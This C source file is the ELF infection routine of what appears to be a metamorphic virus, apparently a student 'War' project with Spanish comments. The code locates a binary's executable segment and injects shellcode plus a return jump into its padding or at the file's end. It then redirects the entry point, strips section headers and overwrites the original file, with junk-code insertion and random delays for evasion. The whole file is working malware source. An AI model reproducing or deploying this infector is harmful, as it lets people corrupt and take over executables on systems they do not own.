#include "../../include/war.h"
#include "../../include/metamorph_shellcode.h"

static int write_infected_file(const char *filepath, void *data, size_t size)
{
	int fd;
	ssize_t written;
	struct stat st;
	mode_t original_mode = 0644;
	if (stat(filepath, &st) == 0)
	{
		original_mode = st.st_mode;
	}
	fd = custom_open(filepath, O_WRONLY | O_TRUNC);
	if (fd < 0)
		return -1;
	written = custom_write(fd, data, size);
	fchmod(fd, original_mode);
	custom_close(fd);
	if (written < 0 || (size_t)written != size)
		return -1;
	return 0;
}

int infect_binary(const char *filepath)
{
	t_elf elf = {0};
	void *new_data = NULL;
	size_t new_size;
	size_t original_size;
	long long save;
	Elf64_Ehdr *new_ehdr;
	Elf64_Phdr *new_phdr;
	Elf64_Shdr *new_shdr;
	int ret = -1;

	save = pepino;
	insert_garbage();
	int order = get_execution_order();
	pepino *= 11;

	if (order == 0 || order == 1)
	{
		if (parse_elf(filepath, &elf) < 0)
			return -1;
		insert_garbage3();
	}
	pepino += 23432;
	if (order == 2 || order == 3)
	{
		if (parse_elf(filepath, &elf) < 0)
			return -1;
		insert_garbage4();
	}
	insert_garbage4();

	if (is_infected(&elf))
	{
		cleanup_elf(&elf);
		return 0;
	}
	random_delay();

	original_size = elf.size;
	uint64_t original_entry = elf.ehdr->e_entry;

	// Find the executable PT_LOAD segment (TEXT) - mejor para inyección porque no tiene .bss
	Elf64_Phdr *phdr = (Elf64_Phdr *)((char *)elf.data + elf.ehdr->e_phoff);
	Elf64_Phdr *text_seg = NULL;
	size_t text_seg_idx = 0;

	for (int i = 0; i < elf.ehdr->e_phnum; i++)
	{
		if (phdr[i].p_type == PT_LOAD)
		{
			// Buscar el segmento ejecutable (TEXT) - tiene flag PF_X y filesz == memsz
			if ((phdr[i].p_flags & PF_X) && phdr[i].p_filesz == phdr[i].p_memsz)
			{
				text_seg = &phdr[i];
				text_seg_idx = i;
			}
		}
	}

	if (!text_seg)
	{
		cleanup_elf(&elf);
		return -1;
	}

	// Calcular el padding disponible después del segmento TEXT
	size_t segment_file_end = text_seg->p_offset + text_seg->p_filesz;
	
	// Buscar el siguiente segmento para calcular el padding disponible
	size_t next_seg_offset = original_size; // Por defecto, fin del archivo
	for (int i = 0; i < elf.ehdr->e_phnum; i++) {
		if (phdr[i].p_offset > segment_file_end && phdr[i].p_offset < next_seg_offset) {
			next_seg_offset = phdr[i].p_offset;
		}
	}
	
	size_t available_padding = next_seg_offset - segment_file_end;

	// El payload va al final del segmento TEXT, usando el padding existente
	size_t payload_file_offset = segment_file_end;
	
	// Para TEXT, filesz == memsz, así que la relación vaddr-offset es simple
	uint64_t vaddr_offset_diff = text_seg->p_vaddr - text_seg->p_offset;
	uint64_t payload_vaddr = payload_file_offset + vaddr_offset_diff;

	// Generate jump to original entry point
	unsigned char jmp_to_original[14];
	size_t jmp_size;

	uint64_t jmp_from = payload_vaddr + METAMORPH_SHELLCODE_SIZE;
	uint64_t jmp_to = original_entry;
	int64_t rel_offset = (int64_t)(jmp_to - (jmp_from + 5));

	if (rel_offset >= INT32_MIN && rel_offset <= INT32_MAX)
	{
		jmp_to_original[0] = 0xE9;
		*(int32_t *)(&jmp_to_original[1]) = (int32_t)rel_offset;
		jmp_size = 5;
	}
	else
	{
		jmp_to_original[0] = 0xFF;
		jmp_to_original[1] = 0x25;
		*(uint32_t *)(&jmp_to_original[2]) = 0;
		*(uint64_t *)(&jmp_to_original[6]) = jmp_to;
		jmp_size = 14;
	}

	// Get signature for injection (texto plano, visible con strings)
	const char *sig = get_signature();
	size_t sig_len = strlen(sig) + 1;

	// Calculate total injection size: shellcode + jump + signature
	size_t total_injection_size = METAMORPH_SHELLCODE_SIZE + jmp_size + sig_len;

	// Decidir estrategia: padding o extender archivo
	int use_padding = (total_injection_size <= available_padding);
	
	if (use_padding) {
		new_size = original_size;
	} else {
		// Inyectar al final del archivo, extendiendo el segmento TEXT
		payload_file_offset = original_size;
		payload_vaddr = payload_file_offset + vaddr_offset_diff;
		new_size = original_size + total_injection_size;
		
		// Recalcular JMP con nueva posición
		jmp_from = payload_vaddr + METAMORPH_SHELLCODE_SIZE;
		rel_offset = (int64_t)(jmp_to - (jmp_from + 5));
		
		if (rel_offset >= INT32_MIN && rel_offset <= INT32_MAX) {
			jmp_to_original[0] = 0xE9;
			*(int32_t *)(&jmp_to_original[1]) = (int32_t)rel_offset;
			jmp_size = 5;
		} else {
			jmp_to_original[0] = 0xFF;
			jmp_to_original[1] = 0x25;
			*(uint32_t *)(&jmp_to_original[2]) = 0;
			*(uint64_t *)(&jmp_to_original[6]) = jmp_to;
			jmp_size = 14;
		}
	}

	new_data = malloc(new_size);
	if (!new_data)
	{
		cleanup_elf(&elf);
		return -1;
	}

	insert_garbage5();

	// Copiar archivo original
	memcpy(new_data, elf.data, original_size);

	// Escribir shellcode en la posición calculada
	memcpy((char *)new_data + payload_file_offset, metamorph_shellcode, METAMORPH_SHELLCODE_SIZE);

	// PARCHE: Reemplazar el último byte del shellcode (ret = 0xc3) con NOP (0x90)
	unsigned char *shellcode_end = (unsigned char *)new_data + payload_file_offset + METAMORPH_SHELLCODE_SIZE - 1;
	if (*shellcode_end == 0xc3) {
		*shellcode_end = 0x90;
	}

	// Escribir JMP
	memcpy((char *)new_data + payload_file_offset + METAMORPH_SHELLCODE_SIZE, jmp_to_original, jmp_size);

	// Sobrescribir con signature
	memcpy((char *)new_data + payload_file_offset + METAMORPH_SHELLCODE_SIZE + jmp_size, sig, sig_len);

	cleanup_elf(&elf);

	// Modify headers
	new_ehdr = (Elf64_Ehdr *)new_data;
	new_phdr = (Elf64_Phdr *)((char *)new_data + new_ehdr->e_phoff);
	// new_shdr ya no se usa porque invalidamos la section table
	(void)new_shdr; // Evitar warning de variable no usada

	// Change entry point to shellcode (+ offset de la función principal)
	uint64_t shellcode_entry = payload_vaddr + METAMORPH_ENTRY_OFFSET;
	new_ehdr->e_entry = shellcode_entry;

	// Extender filesz y memsz del segmento TEXT para incluir el payload
	if (use_padding) {
		// Solo extendemos por el tamaño de la inyección dentro del padding
		new_phdr[text_seg_idx].p_filesz += total_injection_size;
		new_phdr[text_seg_idx].p_memsz += total_injection_size;
	} else {
		// Extendemos hasta el final del archivo (incluyendo lo que había después del segmento)
		// Usamos new_phdr porque text_seg apuntaba a memoria ya liberada
		size_t extension = (payload_file_offset + total_injection_size) - 
		                   (new_phdr[text_seg_idx].p_offset + new_phdr[text_seg_idx].p_filesz);
		new_phdr[text_seg_idx].p_filesz += extension;
		new_phdr[text_seg_idx].p_memsz += extension;
	}

	// TEXT ya es ejecutable, pero verificamos por si acaso
	if (!(new_phdr[text_seg_idx].p_flags & PF_X))
	{
		new_phdr[text_seg_idx].p_flags |= PF_X;
	}

	// IMPORTANTE: Invalidar section header table para evitar confusión del loader
	// El binario no necesita las secciones para ejecutarse, solo los program headers
	new_ehdr->e_shoff = 0;
	new_ehdr->e_shnum = 0;
	new_ehdr->e_shstrndx = 0;

	insert_garbage5();

	ret = write_infected_file(filepath, new_data, new_size);
	free(new_data);

	pepino = save;
	pepino *= 1;
	return ret;
}